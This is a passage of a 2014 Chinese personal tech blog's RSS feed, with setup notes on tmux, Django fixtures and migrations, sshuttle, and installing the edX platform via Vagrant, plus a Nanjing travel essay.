&lt;li&gt;&lt;a href="https://github.com/gmarik/Vundle.vim"&gt;Vundle.vim&lt;/a&gt; , vim杀手级插件,用来管理插件&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Valloric/YouCompleteMe"&gt;YouCompleteMe&lt;/a&gt; ,代码补全&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/vim-scripts/taglist.vim"&gt;taglist.vim&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;tmux  , 用来把终端分屏,使用ssh的时候就很爽啦&lt;/li&gt;
&lt;li&gt;zsh , 当然是使用&lt;a href="https://github.com/robbyrussell/oh-my-zsh"&gt;oh-my-zsh&lt;/a&gt;啦  , 对zsh觊觎已久,觉得bash还顺手一直没换,今天看到zsh如此炫酷的演示,果断换上&lt;/li&gt;
&lt;li&gt;keynav , 把键盘当鼠标用&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;tmux使用笔记&lt;/h3&gt;
&lt;p&gt;参考&lt;a href="https://wiki.freebsdchina.org/software/t/tmux"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;tmux&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ctrl+b&lt;/code&gt;:激活控制台；此时以下按键生效&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?&lt;/code&gt;: 列出所有快捷键；按q返回&lt;/li&gt;
&lt;li&gt;&lt;code&gt;“&lt;/code&gt;: 将当前面板平分为上下两块&lt;/li&gt;
&lt;li&gt;&lt;code&gt;o&lt;/code&gt;: 在当前窗口中选择下一面板&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;what an interesting day ~&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 30 May 2014 00:00:00 +0000</pubDate><guid>tag:,2014-05-30:something-interesting.html</guid><category>ubuntu</category></item><item><title>django笔记之fixtures</title><link>/use-fixtures.html</link><description>&lt;p&gt;主要参考&lt;a href="https://docs.djangoproject.com/en/dev/howto/initial-data/"&gt;官方文档&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;为何用它&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Providing initial data for models&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Where Django finds fixture files&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;By default, Django looks in the &lt;code&gt;fixtures&lt;/code&gt; directory inside each app for fixtures. You can set the FIXTURE_DIRS setting to a list of additional directories where Django should look.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;相关指令&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;python manage.py loaddata APPNAME&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;python manage.py dumpdata APPNAME&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;导出数据&lt;/h3&gt;
&lt;p&gt;参考&lt;a href="https://docs.djangoproject.com/en/dev/ref/django-admin/#dumpdata-app-label-app-label-app-label-model"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;python manage.py dumpdata APPNAME&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The output of dumpdata can be used as input for loaddata.&lt;/li&gt;
&lt;li&gt;Outputs to standard output all data in the database associated &lt;code&gt;with the named application(s)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;By default dumpdata will output all the serialized data to standard output. &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;导入数据&lt;/h3&gt;
&lt;p&gt;参考&lt;a href="https://docs.djangoproject.com/en/dev/ref/django-admin/#django-admin-loaddata"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;python manage.py dumpdata APPNAME&lt;/code&gt;,会自动加载APPNAME/fixtures/xx.json&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;实例演示&lt;/h3&gt;
&lt;p&gt;需求:对myblog(一个app)的数据进行导出与导入&lt;/p&gt;
&lt;h4&gt;导出&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;python manage.py dumpdata myblog&amp;gt;mydata.json&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将mydata.json剪切到myblog/fixtures文件夹下&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;导入&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;python manage.py loaddata myblog&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 30 May 2014 00:00:00 +0000</pubDate><guid>tag:,2014-05-30:use-fixtures.html</guid><category>django</category></item><item><title>sshuttle使用笔记</title><link>/use-sshuttle.html</link><description>&lt;h3&gt;sshuttle是什么&lt;/h3&gt;
&lt;p&gt;闲逛github时看到基于 python 的 sshuttle&lt;/p&gt;
&lt;p&gt;sshuttle被称为穷人的VPN.就是说它是免费的.&lt;/p&gt;
&lt;p&gt;仅仅免费其实不够诱人,让我动心的是它的简单,而且可以在&lt;code&gt;纯命令行&lt;/code&gt;下使用.&lt;/p&gt;
&lt;p&gt;理论上vpn也是可以在纯命令行下使用的,我先后按照几个教程,都未成功.当然图形界面配置vpn很简单.&lt;/p&gt;
&lt;p&gt;可问题是我必须在远程服务器上使用vpn(当然是用ssh登陆), 更新部署代码 , 需要连接国外服务器.&lt;/p&gt;
&lt;h3&gt;如何使用&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;(ubuntu下)首先安装它: &lt;code&gt;sudo apt-get install sshuttle&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;sshuttle -r action@apne1.nitrousbox.com:22411  0.0.0.0/0 -vv&lt;/li&gt;
&lt;li&gt;搞定 , 就这么简单
注意action@apne1.nitrousbox.com:22411是我的ssh,你可以用你自己的,格式为username@sshserver,&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我把sshserver理解为跳板机,在我的需求中,需要有一个国外的ssh账号,你有国外的vps的话就好办了,没有也没关系,感谢云平台的的兴起,我们只要注册&lt;a href="https://www.nitrous.io"&gt;nitrous&lt;/a&gt;,就能有一个免费的ssh账号. &lt;/p&gt;
&lt;p&gt;如果你使用&lt;a href="https://www.nitrous.io"&gt;nitrous&lt;/a&gt;记得每次使用时登录后把它打开.&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;14.9.26号更新&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.nitrous.io"&gt;nitrous&lt;/a&gt;好像最近网络也有问题了，可以试试&lt;a href="https://www.openshift.com"&gt;openshift&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;that`s all.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 30 May 2014 00:00:00 +0000</pubDate><guid>tag:,2014-05-30:use-sshuttle.html</guid><category>ssh</category></item><item><title>edx之安装fullstack</title><link>/edx-fullstack-installation.html</link><description>&lt;p&gt;主要是参考&lt;a href="https://github.com/edx/configuration/wiki/edx-Production-stack--installation-using-Vagrant-Virtualbox"&gt;官方教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本地环境：&lt;code&gt;ubuntu12.04&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;准备工作：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.virtualbox.org/wiki/Downloads"&gt;VirtualBox&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://downloads.vagrantup.com"&gt;Vagrant&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我所采用的版本为：&lt;a href="http://download.virtualbox.org/virtualbox/4.3.10/virtualbox-4.3_4.3.10-93012~Ubuntu~precise_i386.deb"&gt;VirtualBox v4.3.10&lt;/a&gt; ， &lt;a href="https://dl.bintray.com/mitchellh/vagrant/vagrant_1.6.2_i686.deb"&gt;Vagrant 1.6.2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;另外需要注意 ， 得有足够大的剩余磁盘空间(建议剩余20G以上)&lt;/p&gt;
&lt;h3&gt;开始安装&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;mkdir fullstack&lt;/li&gt;
&lt;li&gt;cd fullstack&lt;/li&gt;
&lt;li&gt;curl -L https://raw.githubusercontent.com/edx/configuration/master/vagrant/release/fullstack/Vagrantfile &amp;gt; Vagrantfile  (这一步耗时很久,需要下载接近5G的包)&lt;/li&gt;
&lt;li&gt;安装ruby和gem&lt;/li&gt;
&lt;li&gt;vagrant plugin install vagrant-hostsupdater  (该命令如果失败,&lt;code&gt;cd ..&lt;/code&gt;之后再执行该命令)&lt;/li&gt;
&lt;li&gt;vagrant up&lt;br /&gt;
完成以上步骤后edx就跑起来了,可通过以下两种方式访问:&lt;/li&gt;
&lt;li&gt;http://192.168.33.10/   lms(学生系统)&lt;/li&gt;
&lt;li&gt;http://192.168.33.10:18010  cms(课件制作系统)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;管理edx&lt;/h3&gt;
&lt;p&gt;参考&lt;a href="https://github.com/edx/configuration/wiki/edX-Managing-the-Production-Stack"&gt;官方文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先需要登陆系统(登陆到虚拟机):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;cd fullstack&lt;/li&gt;
&lt;li&gt;vagrant ssh.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;之后再执行其他操作.&lt;/p&gt;
&lt;h3&gt;安装主题&lt;/h3&gt;
&lt;p&gt;我使用斯坦福开源的主题,之后自己定制.&lt;/p&gt;
&lt;p&gt;vi /edx/app/edx_ansible/server-vars.yml , 添加以下内容:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;edxapp_use_custom_theme&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
&lt;span class="n"&gt;edxapp_theme_name&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;stanford&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;edxapp_theme_source_repo&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;git://github.com/Stanford-Online/edx-theme.git&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;edxapp_theme_version&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;HEAD&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后进行更新&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo /edx/bin/update edx-platform master
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;以上命令会将系统更新至github上的最新版本.需要耗费一些时间.如果出错基本是网络的原因,重新执行以上命令,或等待网络较好时执行.&lt;br /&gt;
此外在执行以上命令时更换pip的源能加快速度.&lt;br /&gt;
更换pip的源: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;cd  ~/&lt;/li&gt;
&lt;li&gt;mkdir .pip&lt;/li&gt;
&lt;li&gt;vi pip.conf 加入以下内容:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[global]&lt;/span&gt;
&lt;span class="na"&gt;index-url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;http://mirrors.bistu.edu.cn/pypi/simple&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;定制前台&lt;/h3&gt;
&lt;p&gt;本质上是修改主题包.&lt;br /&gt;
主题包的位置:&lt;code&gt;/edx/app/edxapp/themes&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;本地化(汉化)&lt;/h3&gt;
&lt;p&gt;参考&lt;a href="http://d.edustack.org/t/hyperv-master/9/2"&gt;这里&lt;/a&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sudo apt-get install transifex-client&lt;/li&gt;
&lt;li&gt;vi ~/.transifexrc,加入以下内容:(注意:user,pass是www.transifex.com网站的用户名和密码,需要先注册)&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;transifex&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;hostname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;transifex&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;
&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;pass&lt;/span&gt;
&lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;chmod o+rw ~/.transifexrc&lt;/li&gt;
&lt;li&gt;sudo -u edxapp bash&lt;/li&gt;
&lt;li&gt;source /edx/app/edxapp/edxapp_env&lt;/li&gt;
&lt;li&gt;cd /edx/app/edxapp/edx-platform&lt;/li&gt;
&lt;li&gt;vi lms/envs/common.py 加入 &lt;code&gt;LANGUAGE_CODE = 'zh_CN'&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;vi cms/envs/common.py 加入 &lt;code&gt;LANGUAGE_CODE = 'zh_CN'&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;tx pull -a&lt;/li&gt;
&lt;li&gt;rake i18n:generate&lt;/li&gt;
&lt;li&gt;rake lms:gather_assets:aws&lt;/li&gt;
&lt;li&gt;rake cms:gather_assets:aws&lt;/li&gt;
&lt;li&gt;exit&lt;/li&gt;
&lt;li&gt;sudo /edx/bin/supervisorctl -c /edx/etc/supervisord.conf restart edxapp:
需要等一短时间再访问,否则可能出现502错误.&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 13 May 2014 00:00:00 +0000</pubDate><guid>tag:,2014-05-13:edx-fullstack-installation.html</guid><category>edx</category></item><item><title>django1.7试用</title><link>/try-to-use-django1.7.html</link><description>&lt;p&gt;django1.7是django一个具有里程碑性质的版本.&lt;/p&gt;
&lt;p&gt;我们先来看下官方的介绍:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Django 1.7 is shaping up to be the biggest Django release since 1.0. It has a new app loading framework, a new checks framework, many improvements to query construction, and most importantly - Migrations.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其中最惹人注目的是&lt;code&gt;Migrations&lt;/code&gt;,负责数据库表结构自动迁移,这个工作原先是由South来做的.现在是django原生功能啦!&lt;/p&gt;
&lt;p&gt;它有多炫呢?我们通过例子来说明.&lt;/p&gt;
&lt;h3&gt;搭建环境&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /tmp
mkdir djangotest
&lt;span class="nb"&gt;cd&lt;/span&gt; djangotest
virtualenv django1.7
&lt;span class="nb"&gt;source&lt;/span&gt; django1.7/bin/activate
pip install https://github.com/django/django/archive/1.7b3.zip
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;创建项目&lt;/h3&gt;
&lt;p&gt;承上.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;django-admin startproject mysite
&lt;span class="nb"&gt;cd&lt;/span&gt; mysite
python manage.py startapp blog
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;将blog加入settings.py的INSTALL_APP里.  &lt;/p&gt;
&lt;p&gt;编辑blog/models.py:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Blog&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;回到项目根目录执行:&lt;code&gt;python manage.py syncdb&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;改变model&lt;/h3&gt;
&lt;p&gt;现在我想为Blog添加content属性.怎么办呢?&lt;br /&gt;
简单,直接将blog/models.py改为:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Blog&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这样是不够的,我们需要将数据库也同步,在django1.7以前,我们有两条解决方案:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用manage提供的sqlall生成sql语句,然后手动在数据库中执行sql语句.这在djangobook中由介绍&lt;/li&gt;
&lt;li&gt;使用south&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用django就容易多了.&lt;/p&gt;
&lt;p&gt;我们只需执行两条指令:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python manage.py makemigrations
python manage.py migrate
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;搞定!&lt;br /&gt;
需要说明的是新加的属性,需要default参数,否则无法执行.&lt;/p&gt;
&lt;p&gt;enjoying it~&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 13 May 2014 00:00:00 +0000</pubDate><guid>tag:,2014-05-13:try-to-use-django1.7.html</guid><category>django</category></item><item><title>南京纪游</title><link>/%E5%8D%97%E4%BA%AC%E7%BA%AA%E6%B8%B8.html</link><description>&lt;h3&gt;晚晴楼&lt;/h3&gt;
&lt;p&gt;去晚晴楼最好晚上，楼近秦淮。茶余饭饱，沿河徐行，吴侬软语倒是没听到，桨声灯影确是有的&lt;br /&gt;
秦淮脂褪水如蓝&lt;br /&gt;
晚晴楼的小吃颇为精致，食物以小碟装，量少，不过种类繁多，几碟之后意犹未尽&lt;br /&gt;
又不好意思掳起袖子，说，给我整盘大的的吧亲&lt;br /&gt;
而后碟子接踵而至，多得基本每样只吃一口了&lt;br /&gt;
留得胃口在，不怕没夜宵&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;中山陵&lt;/h3&gt;
&lt;p&gt;对风景的兴趣大于古迹，喜欢自然风光又甚于景区，去了不少地方，回想起来，最喜欢的可能竟是山野之间的大沥溪&lt;br /&gt;
当时只道是寻常&lt;br /&gt;
在地图上寻得好大一片绿，欣然而往，后得知是中山陵。山顶的视野好极，四面风光归眼底。&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;莫愁湖&lt;/h3&gt;
&lt;p&gt;莫愁烟雨为金陵48景之首，可惜天朗气清，景色稀疏平常&lt;br /&gt;
但凡是湖，我想，雨天总是别有一番风味的。何况江南&lt;br /&gt;
园内见一联佳:于此间得少佳趣，亦足以畅叙幽情&lt;br /&gt;
过目难忘&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;瞻园&lt;/h3&gt;
&lt;p&gt;园内曲折，有假山瀑布，小路亭台。想起大观园，突发奇想，把自己和游人代入红楼，竟有奇趣&lt;br /&gt;
yy罢，想找个安静的地方将其记入印象笔记，而不可得。游人如鲫,五一的景区都被挤成地铁站了。&lt;/p&gt;
&lt;p&gt;至于狮子桥的伊氏汤包真的很赞，感谢小伙伴的推荐。&lt;br /&gt;
你想啊，我，一个口味挑剔的业余吃货，都给它做广告了&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;燕子矶&lt;/h3&gt;
&lt;p&gt;金陵48景之一&lt;br /&gt;
据说 燕矶夕照 很美&lt;br /&gt;
我来恰是夕阳时&lt;br /&gt;
长江落日，晚风袭人&lt;br /&gt;
多么适合发呆的地方  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;公元年月日，你是某行人&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 03 May 2014 00:00:00 +0000</pubDate><guid>tag:,2014-05-03:南京纪游.html</guid><category>随笔</category></item><item><title>edx安装笔记</title><link>/edx-install.html</link><description>&lt;p&gt;基本上按照&lt;a href="http://blog.coursegraph.com/安装开源在线教育平台edX的一个简单方法"&gt;这个教程&lt;/a&gt;做(实际上这个教程是翻译自&lt;a href="https://people.csail.mit.edu/ichuang/edx/"&gt;这里&lt;/a&gt;)，期间出现过两个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;磁盘空间不够&lt;/li&gt;
&lt;li&gt;Preparing network interfaces时出错。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;均解决 &lt;/p&gt;
&lt;p&gt;环境：&lt;code&gt;ubuntu12.04&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;1 . 准备工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.virtualbox.org/wiki/Downloads"&gt;VirtualBox&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://downloads.vagrantup.com"&gt;Vagrant&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我所采用的版本为：VirtualBox v4.3.2  ， Vagrant 1.3.5&lt;br /&gt;
我在使用低版本时，Preparing network interfaces based on configuration...这个阶段出现错误，所以换为高版本.&lt;br /&gt;
另外需要注意 ， 得有足够大的剩余磁盘空间  &lt;/p&gt;
&lt;p&gt;2  . 建立相关的目录&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mkdir mitx-vagrant&lt;/li&gt;
&lt;li&gt;cd mitx-vagrant&lt;/li&gt;
&lt;li&gt;mkdir data&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3 . 下载的课程样例:下载&lt;a href="https://github.com/mitocw/edx4edx_lite"&gt;edx4edx_lite&lt;/a&gt;到&lt;code&gt;data&lt;/code&gt;目录下&lt;/p&gt;
&lt;p&gt;4  . 下载这个3.4G的镜像（下载到mitx-vagrant目录下）： &lt;a href="https://people.csail.mit.edu/ichuang/edx/download.php?file=mitxvm-edx-platform-08jun13b.box"&gt;mitxvm-edx-platform-08jun13b.box&lt;/a&gt;,或者下载这个&lt;a href="https://people.csail.mit.edu/ichuang/edx/download.php?file=mitxvm-edx-platform-02sep13a.box"&gt;较新的版本&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;5  . vargrant初始化(在mitx-vagrant目录下)：vagrant init mitxvm mitxvm-edx-platform-08jun13b.box&lt;/p&gt;
&lt;p&gt;6  、启动环境：vagrant up （这个需要一段时间）&lt;/p&gt;
&lt;p&gt;7  、在上述工作完成后，就可以在本地局域网下访问相应的站点了：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;http://192.168.42.2 — LMS（学习管理系统，也就是学生用的系统，我们在edX公开课平台上看到的就是，这个本地站点目前只有edx4edx样例课程）&lt;/li&gt;
&lt;li&gt;http://192.168.42.3 — CMS (Studio)（内容管理系统，也就是开课老师用的系统，你可以在这个里面尝试编辑和创建课程）&lt;/li&gt;
&lt;li&gt;http://192.168.42.4 — Preview (Studio)&lt;/li&gt;
&lt;li&gt;http://192.168.42.5 — Edge (Studio)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;其他&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;vagrant ssh&lt;/code&gt; 连接到虚拟机里，那样你就像操作远程系统一样操作它.&lt;code&gt;sudo -s&lt;/code&gt;,&lt;code&gt;apt-get install vim&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;把整个虚拟环境放到移动硬盘里会很方便&lt;/li&gt;
&lt;li&gt;修改样式(覆盖templates与static就行)&lt;ul&gt;
&lt;li&gt;vagrant ssh之后 cd ~/edx_all/edx-platform/lms/templates &lt;/li&gt;
&lt;li&gt;vi index.html&lt;/li&gt;
&lt;li&gt;wq之后,刷新页面。生效&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;edx使用了&lt;a href="http://help.42qu.com/code/mako.html"&gt;mako模板&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考资料：&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.coursegraph.com/安装开源在线教育平台edX的一个简单方法"&gt;安装开源在线教育平台edX的一个简单方法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://people.csail.mit.edu/ichuang/edx/"&gt;Quick Start to working with the edX Platform&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 26 Apr 2014 00:00:00 +0000</pubDate><guid>tag:,2014-04-26:edx-install.html</guid><category>edx</category></item><item><title>python学习笔记之数据分析(一)</title><link>/python_for_data_analysis_1.html</link><description>&lt;p&gt;对数据分析的兴趣倒不是盲目追随"大数据"热.&lt;/p&gt;
&lt;p&gt;之前朋友需要处理一些xls数据(来自医院),做些统计分析,对药效给出分析结论.我跃跃欲试,觉得应该挺有意思,当时我的大体思路是这样的:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;首先,将数据导出成csv文件.&lt;/li&gt;
&lt;li&gt;使用peewee建立对象模型,其实是想借用sql本身具有的查询统计功能&lt;/li&gt;
&lt;li&gt;解析csv到对象模型中&lt;/li&gt;
&lt;li&gt;分析处理对象集&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;实际操作很繁琐,遇到的一些经典问题如数据缺失之类.&lt;/p&gt;
&lt;p&gt;后台偶然的机会在图书馆看到这本书&lt;code&gt;利用Python进行数据分析&lt;/code&gt;(Python for Data Analysis),十分喜欢.&lt;/p&gt;
